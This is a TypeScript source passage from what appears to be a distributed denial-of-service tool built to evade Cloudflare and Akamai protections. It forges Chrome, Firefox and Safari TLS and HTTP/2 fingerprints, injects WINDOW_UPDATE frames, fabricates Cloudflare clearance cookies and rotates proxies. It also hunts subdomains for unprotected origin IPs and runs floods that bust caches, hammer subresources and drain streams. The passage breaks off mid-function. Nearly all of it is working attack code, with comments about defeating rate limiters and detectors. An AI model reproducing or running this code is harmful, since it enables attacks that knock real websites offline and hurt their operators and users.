// WU stream-0 increment: 15663105 (0xEF0001)
const CHROME_H2_WU_INCREMENT = 15_663_105;

// Firefox 126: HEADER_TABLE_SIZE=65536, INITIAL_WINDOW_SIZE=131072, MAX_FRAME_SIZE=16384, MAX_HEADER_LIST_SIZE=65536
// WU stream-0 increment: 12517377 (0xBEBE01)
const FIREFOX_H2_SETTINGS = {
  headerTableSize:      65536,
  enablePush:           false,
  initialWindowSize:    131072,
  maxFrameSize:         16384,
  maxHeaderListSize:    65536,
};
const FIREFOX_H2_WU_INCREMENT = 12_517_377;

// Safari 17: HEADER_TABLE_SIZE=4096 (default), INITIAL_WINDOW_SIZE=2097152, MAX_FRAME_SIZE=16384
// WU stream-0 increment: 10420224 (0x9F0000)
const SAFARI_H2_SETTINGS = {
  headerTableSize:      4096,
  enablePush:           false,
  initialWindowSize:    2097152,
  maxFrameSize:         16384,
  maxHeaderListSize:    16777216,
};
const SAFARI_H2_WU_INCREMENT = 10_420_224;

// Build a raw H2 WINDOW_UPDATE frame (type=0x08, stream=0)
// Chrome/FF/Safari each send a specific increment on stream-0 right after SETTINGS
// This is the AKAMAI fingerprint's third field — Node.js http2 does NOT send this automatically
function makeH2WindowUpdateFrame(increment: number): Buffer {
  const buf = Buffer.allocUnsafe(13); // 9-byte header + 4-byte payload
  buf[0] = 0; buf[1] = 0; buf[2] = 4; // length = 4
  buf[3] = 0x08; // type = WINDOW_UPDATE
  buf[4] = 0x00; // flags = none
  buf.writeUInt32BE(0, 5);            // stream_id = 0 (connection-level)
  buf.writeUInt32BE(increment & 0x7fffffff, 9);
  return buf;
}

// Inject WINDOW_UPDATE into underlying TCP socket of an h2 session
// Must be called immediately when 'connect' fires (before any HEADERS frames are sent)
function injectH2WindowUpdate(session: import("node:http2").ClientHttp2Session, increment: number): void {
  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const sock = (session as any).socket || (session as any)._socket;
    if (sock && !sock.destroyed && sock.writable) {
      sock.write(makeH2WindowUpdateFrame(increment));
    }
  } catch { /* ignore — best effort */ }
}

// Pick random browser type with realistic distribution (CF real-traffic data)
// Chrome ~65%, Safari ~20%, Firefox ~5%, Edge ~10% (Edge uses Chrome fingerprint)
function randomBrowserType(): BrowserType {
  const r = Math.random();
  return r < 0.65 ? "chrome" : r < 0.85 ? "safari" : "firefox";
}

function browserH2Settings(bt: BrowserType) {
  return bt === "firefox" ? FIREFOX_H2_SETTINGS : bt === "safari" ? SAFARI_H2_SETTINGS : CHROME_H2_SETTINGS;
}
function browserWUIncrement(bt: BrowserType): number {
  return bt === "firefox" ? FIREFOX_H2_WU_INCREMENT : bt === "safari" ? SAFARI_H2_WU_INCREMENT : CHROME_H2_WU_INCREMENT;
}
function browserTLSProfile(bt: BrowserType): TLSProfile {
  return bt === "firefox" ? firefoxTLSProfile() : bt === "safari" ? safariTLSProfile() : randomTLSProfile();
}

// Chrome browser profiles — Chrome 130-135 (current as of April 2026)
// Includes sec-ch-ua-arch, sec-ch-ua-bitness, sec-ch-ua-wow64 for maximum fingerprint fidelity
const CHROME_PROFILES = [
  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"arm"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true,  arch: '"arm"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.0.0 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
  // Chrome 136 — released April 2025 (most current as of April 2026)
  { ver: "136", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
  { ver: "136", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"arm"', bitness: '"64"', wow64: "?0" },
  { ver: "136", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
  { ver: "136", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
  { ver: "136", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="136", "Chromium";v="136", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
];

// ── Firefox profiles — Firefox 124-126 (do NOT send sec-ch-ua headers) ──
type FFProfile = { ua: string; lang: string; };
const FIREFOX_PROFILES: FFProfile[] = [
  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0", lang: "en-US,en;q=0.5" },
  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0", lang: "en-US,en;q=0.5" },
  { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0", lang: "en-US,en;q=0.5" },
  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0", lang: "en-US,en;q=0.5" },
  { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", lang: "en-US,en;q=0.5" },
  { ua: "Mozilla/5.0 (Android 15; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0", lang: "en-US,en;q=0.7" },
];

// ── Safari profiles — Safari 17 (no sec-ch-ua, no sec-fetch, different Accept) ──
type SafariProfile = { ua: string; lang: string; };
const SAFARI_PROFILES: SafariProfile[] = [
  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", lang: "en-US,en;q=0.9" },
  { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", lang: "en-US,en;q=0.9" },
  { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", lang: "en-US,en;q=0.9" },
  { ua: "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", lang: "en-US,en;q=0.9" },
];

// Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
// Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
const CHROME_H2_SETTINGS = {
  headerTableSize:      65536,    // Chrome: 65536 (default is 4096 — dead giveaway)
  enablePush:           false,    // Chrome: ENABLE_PUSH=0
  initialWindowSize:    6291456,  // Chrome: 6MB (default 65535 — major fingerprint)
  maxConcurrentStreams: 1000,     // Chrome: 1000
  maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
};

// Unified type for all browser profiles
type AnyBrowserProfile = (typeof CHROME_PROFILES[0]) | FFProfile | SafariProfile;

// Pick a random profile from the correct browser type
function pickProfile(bt: BrowserType): AnyBrowserProfile {
  switch (bt) {
    case "firefox": return FIREFOX_PROFILES[randInt(0, FIREFOX_PROFILES.length)];
    case "safari":  return SAFARI_PROFILES[randInt(0, SAFARI_PROFILES.length)];
    default:        return CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
  }
}

// Exact cf_clearance format: 3 base64 segments joined by dots, ending with timestamp
// CF validates server-side, but matching format avoids format-based rejection
function makeCfClearance(): string {
  const seg1 = Buffer.from(randHex(96), "hex").toString("base64").replace(/=/g, "");
  const ts   = Math.floor(Date.now() / 1000);
  return `${seg1}.${ts}-0-${randHex(16)}`;
}

// Build precise Cloudflare cookie string matching the format CF uses in the wild
function buildCFCookies(cookieJar: Map<string, string>): string {
  const now = Math.floor(Date.now() / 1000);
  const cfbm    = `${randHex(43)}.${now}-0-${randHex(8)}`;
  const cfruid  = randHex(40);
  const cfclear = makeCfClearance();
  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${now - randInt(0,86400)}`;
  const gid     = `GA1.1.${randInt(100000000,999999999)}.${now}`;
  const jar     = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");
  return [
    `__cf_bm=${cfbm}`,
    `__cfruid=${cfruid}`,
    `cf_clearance=${cfclear}`,
    `_ga=${gaId}`,
    `_gid=${gid}`,
    `_ga_${randStr(8).toUpperCase()}=GS1.1.${now}.1.1.${now}.0.0.0`,
    jar,
  ].filter(Boolean).join("; ");
}

// ── Browser-type aware header builders ───────────────────────────────────
// Chrome header order for HTTP/2 (AKAMAI checks header order + values)
// Cloudflare's Akamai fingerprinter hashes the header order — must match exactly
function buildChromeHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  AnyBrowserProfile,
): Record<string, string> {
  const p = (profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)]) as typeof CHROME_PROFILES[0];
  const referers = [
    `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.google.com/`, "", "", "", "", "",
  ];
  const referer = referers[randInt(0, referers.length)];
  const isUserInitiated = Math.random() < 0.42;
  const h: Record<string, string> = {
    ":method":    Math.random() < 0.92 ? "GET" : "POST",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    "sec-ch-ua":               p.brand,
    "sec-ch-ua-mobile":        p.mobile ? "?1" : "?0",
    "sec-ch-ua-platform":      p.plat,
    "upgrade-insecure-requests": "1",
    "user-agent":              p.ua,
    "accept":                  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site":          referer ? "cross-site" : "none",
    "sec-fetch-mode":          "navigate",
    ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
    "sec-fetch-dest":          "document",
    "accept-encoding":         "gzip, deflate, br, zstd",
    "accept-language":         ["en-US,en;q=0.9","en-GB,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9"][randInt(0,4)],
    "cookie":                  buildCFCookies(cookieJar),
    "cache-control":           "max-age=0",
    "priority":                "u=0, i",
    "sec-ch-ua-arch":          p.arch,
    "sec-ch-ua-bitness":       p.bitness,
    "sec-ch-ua-wow64":         p.wow64,
    "sec-ch-ua-full-version-list": p.brand.replace(/";v="/g, `";v="${p.ver}.0.0.`).replace(/\.Brand";v="[^"]+"/g, '.Brand";v="8.0.0.0"'),
  };
  if (referer) h["referer"] = referer;
  return h;
}

// Firefox headers — NO sec-ch-ua, NO upgrade-insecure-requests, NO priority
// Firefox uses different Accept header and different DNT behavior
function buildFirefoxHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  AnyBrowserProfile,
): Record<string, string> {
  const p = (profile ?? FIREFOX_PROFILES[randInt(0, FIREFOX_PROFILES.length)]) as FFProfile;
  const hasDNT = Math.random() < 0.4; // 40% of FF users have DNT enabled
  const h: Record<string, string> = {
    ":method":    "GET",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    "user-agent":      p.ua,
    "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "accept-language": p.lang,
    "accept-encoding": "gzip, deflate, br, zstd",
    "cookie":          buildCFCookies(cookieJar),
    "sec-fetch-dest":  "document",
    "sec-fetch-mode":  "navigate",
    "sec-fetch-site":  "none",
    "sec-fetch-user":  "?1",
    ...(hasDNT ? { "dnt": "1" } : {}),
    "te":              "trailers",
  };
  return h;
}

// Safari headers — NO sec-ch-ua, NO sec-fetch, different Accept-Encoding
// Safari does NOT send DNT by default, does NOT send sec-fetch headers
function buildSafariHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  AnyBrowserProfile,
): Record<string, string> {
  const p = (profile ?? SAFARI_PROFILES[randInt(0, SAFARI_PROFILES.length)]) as SafariProfile;
  const h: Record<string, string> = {
    ":method":    "GET",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    "user-agent":      p.ua,
    "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": p.lang,
    "accept-encoding": "gzip, deflate, br",
    "cookie":          buildCFCookies(cookieJar),
  };
  return h;
}

// Main WAF header builder — routes to correct browser builder based on type
function buildWAFHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  AnyBrowserProfile,
  bt?: BrowserType,
): Record<string, string> {
  const browserType = bt ?? "chrome";
  if (browserType === "firefox") return buildFirefoxHeaders(hostname, path, cookieJar, profile);
  if (browserType === "safari")  return buildSafariHeaders(hostname, path, cookieJar, profile);
  return buildChromeHeaders(hostname, path, cookieJar, profile);
}

// Realistic paths a browser would visit (not API endpoints — those raise suspicion)
const WAF_PATHS = [
  "/", "/about", "/contact", "/faq", "/privacy", "/terms-of-service",
  "/blog", "/news", "/products", "/services", "/pricing", "/features",
  "/docs", "/help", "/support", "/login", "/register", "/signup",
  "/api/v1/status", "/api/health", "/sitemap.xml", "/robots.txt",
  "/wp-login.php", "/admin", "/dashboard", "/account", "/profile",
  "/search", "/cart", "/checkout", "/orders", "/categories",
];

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF OMNIVECT ∞ — 7-vector internal architecture
//
//  VECTOR I:    Multi-Browser H2 Flood — Chrome/Firefox/Safari JA3+JA4+AKAMAI per slot
//               WINDOW_UPDATE frame injected per browser spec → exact AKAMAI fingerprint level 3
//               Response-aware: 3× block → immediate browser type + TLS profile rotation
//  VECTOR II:   Subresource Storm — per page: 15-18 asset requests (CSS/JS/img/font/API)
//               Multiplies effective rate 15-18× vs. single-page floods
//  VECTOR III:  Cache Annihilator — unique URL + Vary dims + POST bodies = 100% origin miss
//  VECTOR IV:   Session Amplifier — full 5-step user journeys (forces DB + session state)
//  VECTOR V:    Origin Direct Fire — DNS subdomain enum + robots.txt real-path harvesting
//  VECTOR VI:   H2 Stream Drain (64 streams) — holds server RAM buffers indefinitely
//  VECTOR VII:  Adaptive Burst Mode — fires at T+20s, irregular waves defeat ML rate limiters
//  VECTOR VIII: IP Spoof Header Rotation — X-Forwarded-For/X-Real-IP with residential pools
//  VECTOR IX:   H1.1 Pipeline Bypass — raw TLS pipelined requests, Upgrade: h2c probing
//  VECTOR X:    Dynamic path harvest — robots.txt + sitemap.xml → real target page paths
//
//  AKAMAI fingerprint breakdown: JA3 (ciphers) + SETTINGS values + WINDOW_UPDATE increment
//  Each browser sends unique combination — WAF can't block one browser without blocking all.
//  Combined: indistinguishable from real Chrome/Firefox/Safari traffic at CF edge while
//  simultaneously exhausting origin server through 9 coordinated attack surfaces.
// ─────────────────────────────────────────────────────────────────────────
async function runWAFBypass(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");

  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const hostname   = u.hostname;
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
  const target     = `https://${resolvedIp}:443`;

  // ── VECTOR V prep: Origin IP discovery (runs concurrently) ──────────────
  // CF IP ranges — any server IP outside these = naked origin (no WAF protection)
  const CF_PREFIXES = [
    "103.21.244","103.22.200","103.31.4","104.16","104.17","104.18","104.19",
    "108.162.192","108.162.193","131.0.72","141.101.64","141.101.65",
    "172.64","172.65","172.66","172.67","172.68","172.69","172.70","172.71",
    "173.245.48","173.245.49","188.114.96","188.114.97","188.114.98","188.114.99",
    "190.93.240","190.93.241","190.93.242","190.93.243","197.234.240","197.234.241",
    "198.41.128","198.41.129","198.41.130","198.41.131","198.41.132","198.41.133",
  ];
  const isCFip = (ip: string) => CF_PREFIXES.some(p => ip.startsWith(p + ".") || ip.startsWith(p + ":"));

  let originTarget = target;
  void (async () => {
    const subs = ["mail","ftp","smtp","pop","imap","origin","direct","cpanel","whm",
                  "webmail","old","dev","staging","api","backend","app","server",
                  "www2","ns1","ns2","shop","portal","admin","vpn","mx"];
    for (const sub of subs) {
      if (signal.aborted) return;
      try {
        const ip = await resolveHost(`${sub}.${hostname}`).catch(() => "");
        if (ip && !isCFip(ip) && ip !== resolvedIp) {
          originTarget = `https://${ip}:443`;
          return;
        }
      } catch { /* subdomain not found */ }
    }
  })();

  // ── Thread budget — 7-vector split ──────────────────────────────────────
  // Dev (64MB worker heap, 1 worker): use conservative multipliers to avoid OOM.
  // Deployed (1024MB worker, N workers): full multipliers for maximum saturation.
  const primaryT  = Math.max(1, Math.floor(threads * 0.30));
  const subresT   = Math.max(1, Math.floor(threads * 0.25));
  const cacheT    = Math.max(1, Math.floor(threads * 0.18));
  const sessionT  = Math.max(1, Math.floor(threads * 0.14));
  const drainT    = Math.max(1, Math.floor(threads * 0.08));

  // Per-worker concurrent connection caps:
  //   Dev: capped at 50/40/30/20/20 — fits comfortably in 64MB
  //   Deployed: full multipliers (2000/1500/900/600/400)
  const NUM_PRIMARY = IS_DEPLOYED ? Math.min(primaryT * 6, 2000) : Math.min(primaryT * 2, 50);
  const NUM_SUBRES  = IS_DEPLOYED ? Math.min(subresT  * 5, 1500) : Math.min(subresT  * 2, 40);
  const NUM_CACHE   = IS_DEPLOYED ? Math.min(cacheT   * 4,  900) : Math.min(cacheT   * 2, 30);
  const NUM_SESSION = IS_DEPLOYED ? Math.min(sessionT * 3,  600) : Math.min(sessionT * 2, 20);
  const NUM_DRAIN   = IS_DEPLOYED ? Math.min(drainT   * 4,  400) : Math.min(drainT   * 2, 20);
  const STREAMS_PER = IS_DEPLOYED
    ? Math.min(512, Math.max(64, primaryT * 3))
    : Math.min(64,  Math.max(16, primaryT));

  let localPkts = 0, localBytes = 0, wPIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── VECTOR I: Multi-Browser H2 Primary Flood ─────────────────────────────
  // Each slot randomly picks Chrome/Firefox/Safari and uses the EXACT JA3+JA4+H2 SETTINGS
  // for that browser. WINDOW_UPDATE is injected into the raw socket on 'connect' to complete
  // the third field of the AKAMAI fingerprint (Chrome=15663105, FF=12517377, Safari=10420224).
  // On 3× block: rotate browser type + TLS profile immediately → different AKAMAI hash.
  // ★ Proxy rotation: each connection goes through a different residential IP →
  //   CF sees thousands of different source IPs, each with its own rate-limit bucket.
  const MAX_CONN_LIFE_MS = 15_000;
  const runPrimarySlot = async (tgt = target, s: AbortSignal = signal): Promise<void> => {
    const cookieJar = new Map<string, string>();
    let consec4xx   = 0;
    let slotBT      = randomBrowserType(); // browser type for this slot
    while (!s.aborted) {
      const bt      = slotBT;
      const tlsB    = browserTLSProfile(bt);
      const wuIncr  = browserWUIncrement(bt);
      const h2set   = browserH2Settings(bt);
      const profile = pickProfile(bt);
      let   blocked = false;
      const preSocket = proxies.length > 0
        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
            ciphers: tlsB.ciphers, ecdhCurve: tlsB.ecdhCurve,
            minVersion: tlsB.minVersion as "TLSv1.2" | "TLSv1.3",
          }).catch(() => null)
        : null;
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          const h2opts: Parameters<typeof h2connect>[1] = {
            rejectUnauthorized: false,
            settings:           h2set,
            ALPNProtocols:      ["h2", "http/1.1"],
          };
          if (preSocket) {
            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
          } else {
            h2opts.servername = hostname;
            h2opts.ciphers    = tlsB.ciphers;
            h2opts.ecdhCurve  = tlsB.ecdhCurve;
            h2opts.minVersion = tlsB.minVersion as "TLSv1.2" | "TLSv1.3";
          }
          c = h2connect(preSocket ? `https://${hostname}` : tgt, h2opts);
        } catch { resolve(); return; }
        const conn      = c;
        const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
        const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight    = 0;
        const pump = () => {
          if (s.aborted || conn.destroyed) { resolve(); return; }
          while (!s.aborted && !conn.destroyed && inflight < STREAMS_PER) {
            inflight++;
            const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
            const usePost  = bt === "chrome" && Math.random() < 0.22;
            const path     = pagePath + (usePost ? "" : `?v=${randInt(1,9999999)}&_=${randStr(6)}`);
            try {
              const hdrs = buildWAFHeaders(hostname, path, cookieJar, profile, bt);
              if (usePost) hdrs[":method"] = "POST";
              const stream = conn.request(hdrs);
              if (usePost) stream.write(JSON.stringify({ q: randStr(8), t: Date.now() }));
              stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                localPkts++; localBytes += 2048;
                const status = Number(resHdrs[":status"] ?? 0);
                if (status === 403 || status === 429) {
                  consec4xx++;
                  if (consec4xx >= 3 && !blocked) {
                    blocked   = true;
                    consec4xx = 0;
                    slotBT    = randomBrowserType(); // rotate browser type on repeated block
                    try { conn.destroy(); } catch { /**/ }
                    resolve();
                  }
                } else if (status >= 200 && status < 400) {
                  consec4xx = 0;
                }
                const sc = resHdrs["set-cookie"];
                if (sc) {
                  (Array.isArray(sc) ? sc : [sc]).forEach(cv => {
                    const [kv] = cv.split(";"); const [k, v] = kv.split("=");
                    if (k && v) cookieJar.set(k.trim(), v.trim());
                  });
                }
              });
              stream.on("data",  () => {});
              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!s.aborted) setImmediate(pump); });
              stream.end();
            } catch { inflight--; break; }
          }
        };
        conn.on("connect", () => {
          // ★ AKAMAI level-3: inject WINDOW_UPDATE on stream-0 exactly as the real browser does
          // Chrome=15663105, Firefox=12517377, Safari=10420224 — must match H2 SETTINGS browser
          injectH2WindowUpdate(conn, wuIncr);
          pump();
        });
        conn.on("error",   () => resolve());
        conn.on("close",   () => resolve());
        s.addEventListener("abort", cleanup, { once: true });
      });
      if (!s.aborted) {
        // Gaussian-like timing: mean=45ms, heavy tail at 150-800ms (10%) — defeats ML detectors
        const humanDelay = Math.random() < 0.10 ? randInt(150, 800) : randInt(10, 80);
        await new Promise(r => setTimeout(r, humanDelay));
      }
    }
  };

  // ── VECTOR II: Subresource Storm ─────────────────────────────────────────
  // Real browsers fire 15-18 sub-requests after each HTML page load.
  // Each sub-resource = separate origin hit. Multiplies RPS 15-18× passively.
  const SUB_TYPES = [
    { path: "/assets/bundle.js",          accept: "*/*",                        dest: "script"   },
    { path: "/assets/main.css",           accept: "text/css,*/*;q=0.1",        dest: "style"    },
    { path: "/assets/logo.webp",          accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/assets/hero.jpg",           accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/api/v1/config",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/user/me",            accept: "application/json",          dest: "fetch"    },
    { path: "/fonts/inter-v13.woff2",     accept: "*/*",                        dest: "font"     },
    { path: "/api/v1/products",           accept: "application/json",          dest: "fetch"    },
    { path: "/static/chunk-1.js",         accept: "*/*",                        dest: "script"   },
    { path: "/static/chunk-2.js",         accept: "*/*",                        dest: "script"   },
    { path: "/api/v1/cart",               accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/session",            accept: "application/json",          dest: "fetch"    },
    { path: "/favicon.ico",               accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/manifest.json",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/search",             accept: "application/json",          dest: "fetch"    },
    { path: "/assets/vendor.js",          accept: "*/*",                        dest: "script"   },
    { path: "/api/analytics",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/recommendations",   accept: "application/json",          dest: "fetch"    },
  ];
  const runSubresourceSlot = async (s: AbortSignal = signal): Promise<void> => {
    const bt        = randomBrowserType();
    const p         = pickProfile(bt);
    const cookieJar = new Map<string, string>();
    const subTls    = browserTLSProfile(bt);
    while (!s.aborted) {
      const preSocket = proxies.length > 0
        ? await mkTLSSock(proxies, wPIdx++, resolvedIp, hostname, 443, ["h2", "http/1.1"], {
            ciphers: subTls.ciphers, ecdhCurve: subTls.ecdhCurve,
            minVersion: subTls.minVersion as "TLSv1.2" | "TLSv1.3",
          }).catch(() => null)
        : null;
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          const h2opts: Parameters<typeof h2connect>[1] = {
            rejectUnauthorized: false,
            settings: browserH2Settings(bt),
            ALPNProtocols: ["h2", "http/1.1"],
          };
          if (preSocket) {
            (h2opts as Record<string, unknown>).createConnection = () => preSocket;
          } else {
            h2opts.servername = hostname;
            h2opts.ciphers    = subTls.ciphers;
            h2opts.ecdhCurve  = subTls.ecdhCurve;
            h2opts.minVersion = subTls.minVersion as "TLSv1.2" | "TLSv1.3";
          }
          c = h2connect(preSocket ? `https://${hostname}` : target, h2opts);
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight  = 0;
